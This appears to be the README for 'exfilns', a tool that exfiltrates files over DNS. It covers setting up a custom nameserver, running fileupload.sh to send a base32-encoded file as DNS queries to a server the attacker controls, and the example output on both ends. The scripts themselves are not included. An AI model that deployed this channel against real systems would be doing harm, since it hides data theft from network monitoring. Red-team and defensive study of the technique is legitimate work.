# exfilns
Setup: 
have a NS record for the domain you want to use pointed to a server you own

As an example, I run exfil.baki.es pointed to a digital ocean droplet

```
$ dig +short exfil.baki.es NS
ubuntu-nyc1-01.cloud.baki.es.
```

On the server (ubuntu-nyc1-01.cloud.baki.es in the above example) run ns.py with root permissions (to bind to port 53) 

```
$ python3 ns.py --origin exfil.baki.es
Started dns server
```

from any Linux machine you should be able to run the fileupload.sh script to upload a file to that server and given the domain being used

With the examples above an output will look something like this from the client:

```
$ fileupload.sh /path/to/file exfil.baki.es
This file will take 7 dns requests
start-7.aJw0K723Xh.fu.exfil.baki.es
krugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayj.0.aJw0K723Xh.fu.exfil.baki.es
aorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4.1.aJw0K723Xh.fu.exfil.baki.es
zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg.2.aJw0K723Xh.fu.exfil.baki.es
5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzs.3.aJw0K723Xh.fu.exfil.baki.es
ayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkru.4.aJw0K723Xh.fu.exfil.baki.es
gs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaor.5.aJw0K723Xh.fu.exfil.baki.es
sxg5akkrugs4zanfzsayjaorsxg5ak.6.aJw0K723Xh.fu.exfil.baki.es
```


And like this from the server output will now have something like this:
```
New file incoming, lines: 7
File: aJw0K723Xh is still missing 6 lines
File: aJw0K723Xh is still missing 5 lines
File: aJw0K723Xh is still missing 4 lines
File: aJw0K723Xh is still missing 3 lines
File: aJw0K723Xh is still missing 2 lines
File: aJw0K723Xh is still missing 1 lines
File: aJw0K723Xh completed upload
File: aJw0K723Xh written to disk
```

The file is given a unique handle (above `aJw0K723Xh`) and is written in the same folder as the python script and is base32 encoded 
